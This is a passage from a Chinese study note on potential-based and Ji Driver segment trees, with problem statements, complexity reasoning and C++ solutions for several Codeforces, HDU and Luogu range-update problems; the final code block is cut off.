$m$ 行每行三个整数 `k l r`。\n\n- $k=0$ 表示给 $[l,r]$ 中的每个数开平方（下取整）。\n\n- $k=1$ 表示询问 $[l,r]$ 中各个数的和。\n\n**数据中有可能 $l>r$，所以遇到这种情况请交换 $l$ 和 $r$。**\n\n**数据范围**\n\n对于 $30\\%$ 的数据，$1\\le n,m\\le 10^3$，数列中的数不超过 $32767$。\n\n对于 $100\\%$ 的数据，$1\\le n,m\\le 10^5$，$1\\le l,r\\le n$，数列中的数大于 $0$，且不超过 $10^{12}$。\n\n**笔记**\n\n突破点：对一个数反复开根号，并不需要太多的次数，就可以使得这个数变成1，并且在这之后再开根号的话数字仍然不变。\n\n于是我们先暴力遍历到叶子节点开根号，但同时维护某个节点所涵盖的区间是否都变成1，如果都变为1的话，就不需要再暴力遍历该区间开根号了。\n\n### D. The Child and Sequence\n\nhttps://codeforces.com/problemset/problem/438/D\n\n**题目描述**\n\n给定 $n$ 个数，三种操作：\n\n1. 区间询问和\n2. 区间取模\n3. 单点修改\n\n**数据范围**\n\n$1\\le n,m \\le 10^5$ 。其他的数字最大不超过 $10^9$。\n\n**笔记**\n\n突破点：让一个数不断对一些数取模，那么这个数应该是越来越小的，至少不会增大。同时如果这个数已经比模数还小了，就不需要再取模了，取模后的结果就是他本身。\n\n于是我们维护区间的最大值，如果这个最大值比模数还小，那么整个的这个区间并不需要取模。反之，我们暴力取模。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define nt tree[k]\n#define lt tree[ls(k)]\n#define rt tree[rs(k)]\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\n#define _ 100005\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\nint n,m,in[_];\nstruct Node{int sum,mx;} tree[_<<2];\ninline void pushup(int k){\n    nt.sum=lt.sum+rt.sum;\n    nt.mx=max(lt.mx,rt.mx);\n}\nvoid build(int k,int l,int r){\n    if(l==r) return nt.mx=in[l],nt.sum=in[l],void();\n    int mid=(l+r)>>1;\n    build(ls(k),l,mid);\n    build(rs(k),mid+1,r);\n    pushup(k);\n}\nint query(int k,int l,int r,int x,int y){\n    if(l>=x&&r<=y) return nt.sum;\n    int mid=(l+r)>>1,res=0;\n    if(x<=mid) res+=query(ls(k),l,mid,x,y);\n    if(y>mid) res+=query(rs(k),mid+1,r,x,y);\n    return res;\n}\nvoid modify(int k,int l,int r,int x,int y,int p){\n    if(l==r) return nt.sum%=p,nt.mx%=p,void();\n    if(nt.mx<p) return;\n    int mid=(l+r)>>1;\n    if(x<=mid) modify(ls(k),l,mid,x,y,p);\n    if(y>mid) modify(rs(k),mid+1,r,x,y,p);\n    pushup(k);\n}\nvoid change(int k,int l,int r,int x,int v){\n    if(l==r) return nt.sum=nt.mx=v,void();\n    int mid=(l+r)>>1;\n    if(x<=mid) change(ls(k),l,mid,x,v);\n    else change(rs(k),mid+1,r,x,v);\n    pushup(k);\n}\ninline void subtask(){\n    cin>>n>>m;\n    for(int i=1;i<=n;i++) cin>>in[i];\n    build(1,1,n);\n    while(m--){\n        int op,x,y,z;cin>>op>>x>>y;\n        if(op==1) cout<<query(1,1,n,x,y)<<endl;\n        else if(op==2) cin>>z,modify(1,1,n,x,y,z);\n        else if(op==3) change(1,1,n,x,y);\n    }\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t=1;//cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n### F. SUM and REPLACE\n\nhttps://codeforces.com/contest/920/problem/F\n\n**题目描述**\n\n设 $f(x)$ 为 $x$ 的因子个数。现在给定 $n$ 个数，有两种操作：\n\n1. 区间中所有的数字 $x$ 都变为 $f(x)$\n2. 询问区间和\n\n**数据范围**\n\n$1\\le n,m \\le 3\\times 10^5$，$1\\le a_i \\le 10^6$\n\n**笔记**\n\n突破点：和第一道题目一样的道理，修改操作会让数字不断的减小，直到数字变为 $2$ 或 $1$，于是修改操作仍然可以暴力处理。\n\n由于数字的值域只有 $10^6$ ，可以先预处理一把。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define nt tree[k]\n#define lt tree[ls(k)]\n#define rt tree[rs(k)]\n#define _ 1000006\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\nint prime[_],cnt,vis[_],f[_],m,n,in[_];\nstruct Node{int sum,ok;} tree[_<<2];\ninline void init(){\n    f[1]=1;\n    for(int i=2;i<=1000000;i++){\n        f[i]=1;\n        if(!vis[i]) prime[++cnt]=i,vis[i]=i;\n        for(int j=1;j<=cnt&&prime[j]*i<=1000000;j++){\n            vis[i*prime[j]]=prime[j];\n            if(i%prime[j]==0) break;\n        }\n    }\n    for(int i=2;i<=1000000;i++){\n        int x=i;\n        while(x!=1){\n            int c=0;\n            int nxt=vis[x];\n            while(x%nxt==0) x/=nxt,c++;\n            f[i]*=(1+c);\n        }\n    }\n}\nvoid pushup(int k){\n    nt.sum=lt.sum+rt.sum;\n    nt.ok=lt.ok&rt.ok;\n}\nvoid build(int k,int l,int r){\n    if(l==r) return nt.sum=in[l],nt.ok=in[l]<=2?1:0,void();\n    int mid=(l+r)>>1;\n    build(ls(k),l,mid);\n    build(rs(k),mid+1,r);\n    pushup(k);\n}\nint query(int k,int l,int r,int x,int y){\n    if(l>=x&&r<=y) return nt.sum;\n    int mid=(l+r)>>1,res=0;\n    if(x<=mid) res+=query(ls(k),l,mid,x,y);\n    if(y>mid) res+=query(rs(k),mid+1,r,x,y);\n    return res;\n}\nvoid modify(int k,int l,int r,int x,int y){\n    if(nt.ok) return;\n    if(l==r) return nt.ok=f[nt.sum]<=2?1:0,nt.sum=f[nt.sum],void();\n    int mid=(l+r)>>1;\n    if(x<=mid) modify(ls(k),l,mid,x,y);\n    if(y>mid) modify(rs(k),mid+1,r,x,y);\n    pushup(k);\n}\ninline void subtask(){\n    cin>>n>>m;\n    for(int i=1;i<=n;i++) cin>>in[i];\n    build(1,1,n);\n    while(m--){\n        int op,l,r;cin>>op>>l>>r;\n        if(op==1) modify(1,1,n,l,r);\n        else if(op==2) cout<<query(1,1,n,l,r)<<endl;\n    }\n}\nsigned main(){\n    init();\n    // for(int i=1;i<=20;i++){\n    //     cout<<i<<' '<<f[i]<<endl;\n    // }\n    ios::sync_with_stdio(false);\n    int t=1;//cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n### A. And RMQ\n\nhttps://codeforces.com/gym/103107/problem/A\n\n**题目描述**\n\n给定 $n$ 个数，有三种操作：\n\n1. 区间按位与\n2. 单点修改\n3. 区间询问最大值\n\n**数据范围**\n\n$1\\le n,m \\le 4\\times 10^5$\n\n**笔记**\n\n突破点：按位与其实也是有“单调性”的。对于一个数字，对其不断进行按位与，实际上就是不断将其二进制为 $1$ 的位上变为 $0$，$1$ 的数量是单调不增的。如果将数字 $n$ 与某个数字 $x$ 按位与，$x$ 二进制为 $0$ 的位置，$n$ 相同位置上都为 $0$，那么这个按位与实际上是没有效果的。\n\n对于一个区间中的多个数也有上述的效果。我们令 $e=a_l|a_{l+1}|...|a_{r-1}|a_{r}$，即把区间内所有数字都按位或起来。然后如果 $e\\&x=e$ 那么我们就说这个区间的数字就都没必要再对 $x$ 按位与了。\n\n```cpp\n#include<bits/stdc++.h>\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define nt tree[k]\n#define lt tree[ls(k)]\n#define rt tree[rs(k)]\n#define _ 400005\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\n#define LOCAL\nnamespace ly\n{\n    namespace IO\n    {\n        #ifndef LOCAL\n            constexpr auto maxn=1<<20;\n            char in[maxn],out[maxn],*p1=in,*p2=in,*p3=out;\n            #define getchar() (p1==p2&&(p2=(p1=in)+fread(in,1,maxn,stdin),p1==p2)?EOF:*p1++)\n            #define flush() (fwrite(out,1,p3-out,stdout))\n            #define putchar(x) (p3==out+maxn&&(flush(),p3=out),*p3++=(x))\n            class Flush{public:~Flush(){flush();}}_;\n        #endif\n        namespace usr\n        {\n            template<typename type>\n            inline type read(type &x)\n            {\n                x=0;bool flag(0);char ch=getchar();\n                while(!isdigit(ch)) flag^=ch=='-',ch=getchar();\n                while(isdigit(ch)) x=(x<<1)+(x<<3)+(ch^48),ch=getchar();\n                return flag?x=-x:x;\n            }\n            template<typename type>\n            inline void write(type x)\n            {\n                x<0?x=-x,putchar('-'):0;\n                static short Stack[50],top(0);\n                do Stack[++top]=x%10,x/=10;while(x);\n                while(top) putchar(Stack[top--]|48);\n            }\n            inline char read(char &x){do x=getchar();while(isspace(x));return x;}\n            inline char write(const char &x){return putchar(x);}\n            inline void read(char *x){static char ch;read(ch);do *(x++)=ch;while(!isspace(ch=getchar())&&~ch);}\n            template<typename type>inline void write(type *x){while(*x)putchar(*(x++));}\n            inline void read(string &x){static char ch;read(ch),x.clear();do x+=ch;while(!isspace(ch=getchar())&&~ch);}\n            inline void write(const string &x){for(int i=0,len=x.length();i<len;++i)putchar(x[i]);}\n            template<typename type,typename...T>inline void read(type &x,T&...y){read(x),read(y...);}\n            template<typename type,typename...T>\n            inline void write(const type &x,const T&...y){write(x),putchar(' '),write(y...),sizeof...(y)^1?0:putchar('\\n');}\n            template<typename type>\n            inline void put(const type &x,bool flag=1){write(x),flag?putchar('\\n'):putchar(' ');}\n        }\n        #ifndef LOCAL\n            #undef getchar\n            #undef flush\n            #undef putchar\n        #endif\n    }using namespace IO::usr;\n}using namespace ly::IO::usr;\n\ntypedef pair<int,int> pii;\nint n,m,in[_];\nstruct Node{int mx,e;} tree[_<<2];\nvoid pushup(int k){\n    nt.e=lt.e|rt.e;\n    nt.mx=max(lt.mx,rt.mx);\n}\nvoid build(int k,int l,int r){\n    if(l==r) return nt.e=nt.mx=in[l],void();\n    int mid=(l+r)>>1;\n    build(ls(k),l,mid);\n    build(rs(k),mid+1,r);\n    pushup(k);\n}\nvoid modify(int k,int l,int r,int x,int y,int v){\n    if((nt.e&v)==nt.e) return;\n    if(l==r) return nt.mx&=v,nt.e&=v,void();\n    int mid=(l+r)>>1;\n    if(x<=mid) modify(ls(k),l,mid,x,y,v);\n    if(y>mid) modify(rs(k),mid+1,r,x,y,v);\n    pushup(k);\n}\nvoid change(int k,int l,int r,int x,int v){\n    if(l==r) return nt.mx=v,nt.e=v,void();\n    int mid=(l+r)>>1;\n    if(x<=mid) change(ls(k),l,mid,x,v);\n    else change(rs(k),mid+1,r,x,v);\n    pushup(k);\n}\nint query(int k,int l,int r,int x,int y){\n    if(l>=x&&r<=y) return nt.mx;\n    int mid=(l+r)>>1,res=-inf;\n    if(x<=mid) res=max(res,query(ls(k),l,mid,x,y));\n    if(y>mid) res=max(res,query(rs(k),mid+1,r,x,y));\n    return res;\n}\ninline void subtask(){\n    read(n,m);\n    for(int i=1;i<=n;i++) read(in[i]);\n    build(1,1,n);\n    while(m--){\n        char op[4];int x,y,z;\n        read(op,x,y);\n        if(op[0]=='A') read(z),modify(1,1,n,x,y,z);\n        else if(op[0]=='U') change(1,1,n,x,y);\n        else if(op[0]=='Q') put(query(1,1,n,x,y));\n    }\n}\nsigned main(){\n    //ios::sync_with_stdio(false);\n    int t=1;//cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n::: warn 踩坑\n\nmodify 函数那里要写成 `if((nt.e&v)==nt.e) return;` 而不是 `if(nt.e&v==nt.e) return;` ！\n\n:::\n\n### Counting Stars\n\nhttps://vjudge.net/problem/HDU-7059\n\n**题目描述**\n\n给定 $n$ 个数，三种操作：\n\n1. 询问区间和\n2. 将区间内所有数的 lowbit 置为 0\n3. 将区间内所有数的 highbit 左移一位\n\n**数据范围**\n\n$1\\le \\sum n, \\sum q \\le 4\\times 10^5$，且 $1\\le a_i \\le 10^9$\n\n**笔记**\n\n对于操作 2 和 操作 3 都不会增加数字二进制 1 的个数，且操作 2 还会减少二进制 1 的个数，所以对于操作 2 我们可以考虑暴力。但注意，操作 3 也暴力的话时间复杂度就不对了，因为操作 3 并不会减少二进制 1 的个数。我们考虑能不能通过懒标记来优化。\n\n我们把一个数的最高位和其他位分开，即 $x=high+low$，然后操作 3 就相当于把区间内所有的 $high$ 都乘 $2$，这就可以使用懒标记了\n\n```cpp\n//#pragma GCC optimize(3,\"Ofast\",\"inline\")\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define nt tree[k]\n#define lt tree[ls(k)]\n#define rt tree[rs(k)]\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=998244353;\ntypedef pair<int,int> pii;\n#define _ 100005\nstruct Node{int high,low,tag;} tree[_<<2];\nint in[_],pw[_];\ninline int lowbit(int x){return x&-x;}\ninline void pushup(int k){nt.high=(lt.high+rt.high)%mod;nt.low=(lt.low+rt.low)%mod;}\ninline void pushdown(int k){\n    if(!nt.tag) return;\n    lt.high=lt.high*pw[nt.tag]%mod;\n    rt.high=rt.high*pw[nt.tag]%mod;\n    lt.tag+=nt.tag;\n    rt.tag+=nt.tag;\n    nt.tag=0;\n}\nvoid build(int k,int l,int r){\n    nt.tag=0;\n    if(l==r){\n        int now=0,x=in[l];\n        while(x){\n            if(x&1) nt.high=now;\n            x>>=1;now++;\n        }\n        nt.high=pw[nt.high];nt.low=in[l]-nt.high;\n        nt.tag=0;\n        return;\n    }\n    int mid=(l+r)>>1;\n    build(ls(k),l,mid);\n    build(rs(k),mid+1,r);\n    pushup(k);\n}\nint query(int k,int l,int r,int x,int y){\n    if(l>=x&&r<=y) return (nt.low+nt.high)%mod;\n    int mid=(l+r)>>1,res=0;\n    pushdown(k);\n    if(x<=mid) res+=query(ls(k),l,mid,x,y),res%=mod;\n    if(y>mid) res+=query(rs(k),mid+1,r,x,y),res%=mod;\n    return res;\n}\nvoid modify_lowbit(int k,int l,int r,int x,int y){\n    if(!nt.high&&!nt.low) return void();\n    if(l==r){\n        if(nt.low) nt.low-=lowbit(nt.low);\n        else nt.high=0;\n        return;\n    }\n    int mid=(l+r)>>1;\n    pushdown(k);\n    if(x<=mid) modify_lowbit(ls(k),l,mid,x,y);\n    if(y>mid) modify_lowbit(rs(k),mid+1,r,x,y);\n    pushup(k);\n}\nvoid modify_highbit(int k,int l,int r,int x,int y){\n    if(l>=x&&r<=y) return nt.high=nt.high*2%mod,nt.tag++,void();\n    int mid=(l+r)>>1;\n    pushdown(k);\n    if(x<=mid) modify_highbit(ls(k),l,mid,x,y);\n    if(y>mid) modify_highbit(rs(k),mid+1,r,x,y);\n    pushup(k);\n}\ninline void subtask(){\n    int n;cin>>n;\n    for(int i=1;i<=n;i++) cin>>in[i];\n    build(1,1,n);\n    int m;cin>>m;\n    while(m--){\n        int op,l,r;cin>>op>>l>>r;\n        if(op==1) cout<<query(1,1,n,l,r)<<endl;\n        if(op==2) modify_lowbit(1,1,n,l,r);\n        if(op==3) modify_highbit(1,1,n,l,r);\n    }\n}\nsigned main(){\n    pw[0]=1;\n    for(int i=1;i<=100000;i++) pw[i]=pw[i-1]*2%mod;\n    ios::sync_with_stdio(false);\n    int t;cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n::: warn 踩坑\n\n一开始 build 函数那里忘记把 tag 清空了，wa了好几次\n\n:::\n\n### Lowbit\n\nhttps://vjudge.net/problem/HDU-7116\n\n**题目描述**\n\n给定 $n$ 个数，两种操作：\n\n1. 区间内每个数都加上自身的 lowbit\n2. 询问区间和\n\n**数据范围**\n\n$1\\le n,m \\le 10^5$\n\n**笔记**\n\n我们发现，一个数 $x$ 加上 $lowbit(x)$ ，那么这个数的二进制 1 数量要么减少要么不变。如果 $x$ 的二进制 1 数量为 1 了，那么 $x+lowbit(x)$ 就相当于对 $x$ 乘二了。\n\n那么就有了做法，区间内所有的数的二进制 1 数量都为 1 了，那么就相当于区间乘 2 ，使用懒标记。反之，暴力修改\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define nt tree[k]\n#define lt tree[ls(k)]\n#define rt tree[rs(k)]\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=998244353;\ntypedef pair<int,int> pii;\n#define _ 100005\nstruct Node{int sum,ok,tag;} tree[_<<2];\nint in[_],pw[_];\ninline int lowbit(int x){return x&-x;}\ninline int popcnt(int x,int res=0){for(;x;x>>=1) if(x&1) res++;return res;}\ninline void pushup(int k){nt.sum=(lt.sum+rt.sum)%mod;nt.ok=lt.ok&rt.ok;}\ninline void pushdown(int k){\n    if(!nt.tag) return;\n    lt.sum=lt.sum*pw[nt.tag]%mod;\n    rt.sum=rt.sum*pw[nt.tag]%mod;\n    lt.tag+=nt.tag;\n    rt.tag+=nt.tag;\n    nt.tag=0;\n}\nvoid build(int k,int l,int r){\n    nt.tag=0;\n    if(l==r) return nt.sum=in[l],nt.ok=popcnt(in[l])==1?1:0,void();\n    int mid=(l+r)>>1;\n    build(ls(k),l,mid);\n    build(rs(k),mid+1,r);\n    pushup(k);\n}\nint query(int k,int l,int r,int x,int y){\n    if(l>=x&&r<=y) return nt.sum;\n    pushdown(k);\n    int mid=(l+r)>>1,res=0;\n    if(x<=mid) res+=query(ls(k),l,mid,x,y),res%=mod;\n    if(y>mid) res+=query(rs(k),mid+1,r,x,y),res%=mod;\n    return res;\n}\nvoid modify(int k,int l,int r,int x,int y){\n    if(l>=x&&r<=y&&nt.ok) return nt.sum=nt.sum*2%mod,nt.tag++,void();\n    if(l==r) return nt.sum+=lowbit(nt.sum),nt.ok=popcnt(nt.sum)==1?1:0,void();\n    pushdown(k);\n    int mid=(l+r)>>1;\n    if(x<=mid) modify(ls(k),l,mid,x,y);\n    if(y>mid) modify(rs(k),mid+1,r,x,y);\n    pushup(k);\n}\ninline void subtask(){\n    int n;cin>>n;\n    for(int i=1;i<=n;i++) cin>>in[i];\n    build(1,1,n);\n    int m;cin>>m;\n    while(m--){\n        int op,l,r;cin>>op>>l>>r;\n        if(op==1) modify(1,1,n,l,r);\n        if(op==2) cout<<query(1,1,n,l,r)<<endl;\n    }\n}\nsigned main(){\n    pw[0]=1;\n    for(int i=1;i<=100000;i++) pw[i]=pw[i-1]*2%mod;\n    ios::sync_with_stdio(false);\n    int t;cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n## 吉司机线段树\n\n我们把一类需要划分数域来解决的区间最值、区间历史最值问题，用到的势能线段树称为吉司机线段树\n\n### 区间最值操作\n\n以一道题举例\n\n**Gorgeous Sequence**\n\nhttps://vjudge.net/problem/HDU-5306\n\n**题目描述**\n\n给出一个长度为 $n(n\\le 10^6)$ 的序列 $A$ 和 $m(m\\le 10^6)$ 次操作，每次操作为以下三种类型之一：\n\n1. 区间对数字 $k$ 取 min\n2. 求区间最大值\n3. 求区间和\n\n**笔记**\n\n如果没有区间求和的话就很好做了。有区间求和的话我们就不能使用传统的懒标记的方法来做了。\n\n这种题一般是这样考虑的：\n\n维护区间最大值 $mx$ 和次大值 $se$，以及最大值个数 $cnt$，区间和 $sum$，然后进行区间对 $k$ 取 $min$ 的时候，有如下的情况：\n\n- $k\\ge mx$，此时该操作不会对当前节点产生影响\n- $se < k < mx$ ，此时区间上的最大值都会被修改为 $k$，我们借助 $cnt$ 和 $mx$ 快速更新 $sum$\n- $k\\le se$ 时，我们无法快速更新区间信息，选择直接暴力递归左右子树\n\n时间复杂度是正确的，我们这么考虑，当我们递归左右子树的时候，说明该区间内不同的数字个数一定会减少，而线段树每层节点表示的区间内的不同数字个数一共是 $O(n)$ 的，一共有 $\\log n$ 层，因此递归的总时间复杂度是 $O(n\\log n)$。再加上每次操作的复杂度，总时间复杂度为 $O((n+m)\\log n)$\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define nt tree[k]\n#define lt tree[ls(k)]\n#define rt tree[rs(k)]\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\n#define _ 1000006\n#define LOCAL\nnamespace ly\n{\n    namespace IO\n    {\n        #ifndef LOCAL\n            constexpr auto maxn=1<<20;\n            char in[maxn],out[maxn],*p1=in,*p2=in,*p3=out;\n            #define getchar() (p1==p2&&(p2=(p1=in)+fread(in,1,maxn,stdin),p1==p2)?EOF:*p1++)\n            #define flush() (fwrite(out,1,p3-out,stdout))\n            #define putchar(x) (p3==out+maxn&&(flush(),p3=out),*p3++=(x))\n            class Flush{public:~Flush(){flush();}}_;\n        #endif\n        namespace usr\n        {\n            template<typename type>\n            inline type read(type &x)\n            {\n                x=0;bool flag(0);char ch=getchar();\n                while(!isdigit(ch)) flag^=ch=='-',ch=getchar();\n                while(isdigit(ch)) x=(x<<1)+(x<<3)+(ch^48),ch=getchar();\n                return flag?x=-x:x;\n            }\n            template<typename type>\n            inline void write(type x)\n            {\n                x<0?x=-x,putchar('-'):0;\n                static short Stack[50],top(0);\n                do Stack[++top]=x%10,x/=10;while(x);\n                while(top) putchar(Stack[top--]|48);\n            }\n            inline char read(char &x){do x=getchar();while(isspace(x));return x;}\n            inline char write(const char &x){return putchar(x);}\n            inline void read(char *x){static char ch;read(ch);do *(x++)=ch;while(!isspace(ch=getchar())&&~ch);}\n            template<typename type>inline void write(type *x){while(*x)putchar(*(x++));}\n            inline void read(string &x){static char ch;read(ch),x.clear();do x+=ch;while(!isspace(ch=getchar())&&~ch);}\n            inline void write(const string &x){for(int i=0,len=x.length();i<len;++i)putchar(x[i]);}\n            template<typename type,typename...T>inline void read(type &x,T&...y){read(x),read(y...);}\n            template<typename type,typename...T>\n            inline void write(const type &x,const T&...y){write(x),putchar(' '),write(y...),sizeof...(y)^1?0:putchar('\\n');}\n            template<typename type>\n            inline void put(const type &x,bool flag=1){write(x),flag?putchar('\\n'):putchar(' ');}\n        }\n        #ifndef LOCAL\n            #undef getchar\n            #undef flush\n            #undef putchar\n        #endif\n    }using namespace IO::usr;\n}using namespace ly::IO::usr;\n\nstruct Node{int sum,mx,se,tag,cnt;} tree[_<<2];\nint in[_];\ninline void pushup(int k){\n    nt.sum=lt.sum+rt.sum;\n    nt.mx=max(lt.mx,rt.mx);\n    if(lt.mx==rt.mx) nt.se=max(lt.se,rt.se),nt.cnt=lt.cnt+rt.cnt;\n    else nt.se=max(min(lt.mx,rt.mx),max(lt.se,rt.se)),nt.cnt=lt.mx>rt.mx?lt.cnt:rt.cnt;\n}\ninline void update(int k,int x){if(x<nt.mx) nt.sum-=(nt.mx-x)*nt.cnt,nt.mx=nt.tag=x;}\ninline void pushdown(int k){if(nt.tag!=-1) update(ls(k),nt.tag),update(rs(k),nt.tag),nt.tag=-1;}\nvoid build(int k,int l,int r){\n    nt.tag=-1;\n    if(l==r) return nt.sum=nt.mx=in[l],nt.se=-1,nt.cnt=1,void();\n    int mid=(l+r)>>1;\n    build(ls(k),l,mid);\n    build(rs(k),mid+1,r);\n    pushup(k);\n}\nvoid modify(int k,int l,int r,int x,int y,int v){\n    if(v>=nt.mx) return;\n    if(l>=x&&r<=y&&v>nt.se) return update(k,v),void();\n    int mid=(l+r)>>1;\n    pushdown(k);\n    if(x<=mid) modify(ls(k),l,mid,x,y,v);\n    if(y>mid) modify(rs(k),mid+1,r,x,y,v);\n    pushup(k);\n}\nint query_max(int k,int l,int r,int x,int y){\n    if(l>=x&&r<=y) return nt.mx;\n    int mid=(l+r)>>1,res=-inf;\n    pushdown(k);\n    if(x<=mid) res=max(res,query_max(ls(k),l,mid,x,y));\n    if(y>mid) res=max(res,query_max(rs(k),mid+1,r,x,y));\n    return res;\n}\nint query_sum(int k,int l,int r,int x,int y){\n    if(l>=x&&r<=y) return nt.sum;\n    int mid=(l+r)>>1,res=0;\n    pushdown(k);\n    if(x<=mid) res+=query_sum(ls(k),l,mid,x,y);\n    if(y>mid) res+=query_sum(rs(k),mid+1,r,x,y);\n    return res;\n}\ninline void subtask(){\n    int n,m;read(n);read(m);\n    for(int i=1;i<=n;i++) read(in[i]);\n    build(1,1,n);\n    while(m--){\n        int op,l,r,x;read(op),read(l),read(r);\n        if(op==0) read(x),modify(1,1,n,l,r,x);\n        if(op==1) put(query_max(1,1,n,l,r));\n        if(op==2) put(query_sum(1,1,n,l,r));\n    }\n}\nsigned main(){\n    //ios::sync_with_stdio(false);\n    int t;read(t);\n    while(t--) subtask();\n    return 0;\n}\n```\n\n### 支持区间加减\n\n现在既有加减的懒标记，又有取 min 的懒标记，难点在于如何 pushdown 这两个标记\n\n由于取 min 需要依赖原有的值，所以加减的懒标记应该先于 min 懒标记下放\n\n对于加减 $x$，下放的时候直接让子节点的加减懒标记和取 min 懒标记也加减 $x$ 就可以了\n\n对于对 $x$ 取 min，下放的时候直接将子节点的取 min 懒标记置为 $x$。注意这么做的前提是，区间内所有数的最大值是大于 $x$ 的，这样的话可以保证如果多次下放取 min 懒标记，懒标记的值是单调的，直接置为 $x$ 是没问题的\n\n但是有了这个操作之后，上述的时间复杂度分析的方法不适用了。论文[^1]中给出了另一种分析思路，分析出来的时间复杂度为 $O(m\\log^2n)$\n\n[^1]: 吉如一《区间最值操作与历史最值问题》 见 [2016年国家集训队论文集](https://github.com/enkerewpo/OI-Public-Library/blob/master/IOI中国国家候选队论文/国家集训队2016论文集.pdf)\n\n### 取 min 和取 max 同时存在\n\n**P10639 BZOJ4695 最佳女选手**\n\nhttps://www.luogu.com.cn/problem/P10639\n\n**题目描述**\n\n给定一个长度为 $n$ 的序列，要求支持以下 $6$ 种操作：\n\n- 给一个区间 $[l,r]$ 加上一个整数 $x$；\n- 把一个区间 $[l,r]$ 内小于 $x$ 的数都变成 $x$；\n- 把一个区间 $[l,r]$ 内大于 $x$ 的数都变成 $x$；\n- 求区间 $[l,r]$ 的和；\n- 求区间 $[l,r]$ 的最大值；\n- 求区间 $[l,r]$ 的最小值；\n\n**数据范围**\n\n数据保证，$1\\leq n,m\\leq 5\\times 10^5$，$|a_i|\\leq 10^8$。\n\n当进行 $1$ 操作时，$|x| \\leq 1000$；\n\n当进行 $2$ 操作时，$|x| \\leq 10^8$。\n\n**笔记**\n\n现在在支持区间加减的基础上，既支持取 min 又支持取 max。我们可以维护区间最大值，区间次大值，区间最大值个数，区间最小值，区间次小值，区间最小值个数，区间和，以及取 min 懒标记，取 max 懒标记，加减懒标记\n\n有三个懒标记，如何下放就成了问题，显然我们还是先下放加减懒标记\n\n- 对于加减 $x$，下放时子节点的加减懒标记，取 min 懒标记，取 max 懒标记都加减 $x$\n\n后面先下放取 min 懒标记还是先下放取 max 懒标记就无所谓了，我们先下放取 min 懒标记\n\n- 对于对 $x$ 取 min，子节点的取 min 懒标记置为 $x$，然后子节点的取 max 懒标记对 $x$ 取 min，防止先前的取 max 操作影响到本次的取 min 操作\n- 对于对 $x$ 取 max，同理\n\n同时，当一个区间内数字较少的时候，可能会出现最大值、最小值、次小值、次大值中间有几个是相同的\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\n#define _ 500005\n#define nt tree[k]\n#define lt tree[ls(k)]\n#define rt tree[rs(k)]\n#define LOCAL\nnamespace ly\n{\n    namespace IO\n    {\n        #ifndef LOCAL\n            constexpr auto maxn=1<<20;\n            char in[maxn],out[maxn],*p1=in,*p2=in,*p3=out;\n            #define getchar() (p1==p2&&(p2=(p1=in)+fread(in,1,maxn,stdin),p1==p2)?EOF:*p1++)\n            #define flush() (fwrite(out,1,p3-out,stdout))\n            #define putchar(x) (p3==out+maxn&&(flush(),p3=out),*p3++=(x))\n            class Flush{public:~Flush(){flush();}}_;\n        #endif\n        namespace usr\n        {\n            template<typename type>\n            inline type read(type &x)\n            {\n                x=0;bool flag(0);char ch=getchar();\n                while(!isdigit(ch)) flag^=ch=='-',ch=getchar();\n                while(isdigit(ch)) x=(x<<1)+(x<<3)+(ch^48),ch=getchar();\n                return flag?x=-x:x;\n            }\n            template<typename type>\n            inline void write(type x)\n            {\n                x<0?x=-x,putchar('-'):0;\n                static short Stack[50],top(0);\n                do Stack[++top]=x%10,x/=10;while(x);\n                while(top) putchar(Stack[top--]|48);\n            }\n            inline char read(char &x){do x=getchar();while(isspace(x));return x;}\n            inline char write(const char &x){return putchar(x);}\n            inline void read(char *x){static char ch;read(ch);do *(x++)=ch;while(!isspace(ch=getchar())&&~ch);}\n            template<typename type>inline void write(type *x){while(*x)putchar(*(x++));}\n            inline void read(string &x){static char ch;read(ch),x.clear();do x+=ch;while(!isspace(ch=getchar())&&~ch);}\n            inline void write(const string &x){for(int i=0,len=x.length();i<len;++i)putchar(x[i]);}\n            template<typename type,typename...T>inline void read(type &x,T&...y){read(x),read(y...);}\n            template<typename type,typename...T>\n            inline void write(const type &x,const T&...y){write(x),putchar(' '),write(y...),sizeof...(y)^1?0:putchar('\\n');}\n            template<typename 